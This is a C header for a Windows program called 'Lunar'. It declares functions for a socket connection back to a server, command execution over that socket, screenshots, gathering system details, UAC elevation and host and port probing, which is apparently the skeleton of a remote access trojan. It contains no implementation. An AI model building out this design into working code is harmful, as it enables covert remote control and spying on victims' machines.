#ifndef __LUNAR__H__
#define __LUNAR__H__
#include <winsock2.h>
#include <winsock.h>
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <iphlpapi.h>
#include <psapi.h>
#include <wininet.h>
#include <shlwapi.h>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "shlwapi.lib")

#define BUFFER 1024
static BOOL connected = FALSE;

struct sockaddr_in server;
SOCKET sockfd;
char recvbuf[BUFFER];
void ReportError(void);
void WSAReportError(void);

int CaptureAnImage(HWND hWnd);
void TimeStamp(char buffer[100]);
BOOL IsAdmin();
void sockprintf(SOCKET sock, const char* words, ...);
void UACTrigger();
char* LunarInfo();
BOOL isFile(const char* file);
void UserPC();
char* cDir();
void StartWSA(void);
void lunar_main(void);
void MainConnect(void);
void sockSend(const char* data);
DWORD ProcessId(LPCTSTR ProcessName);
void ExecSock(void);
void CheckHost(const char* ip_address);
void checkPort(const char* ip, int port);
const char* IP2Host(const char* IP);
void split(char* src, char* dest[5], const char* delimeter);
void REConnect();

#endif //!__LUNAR__H__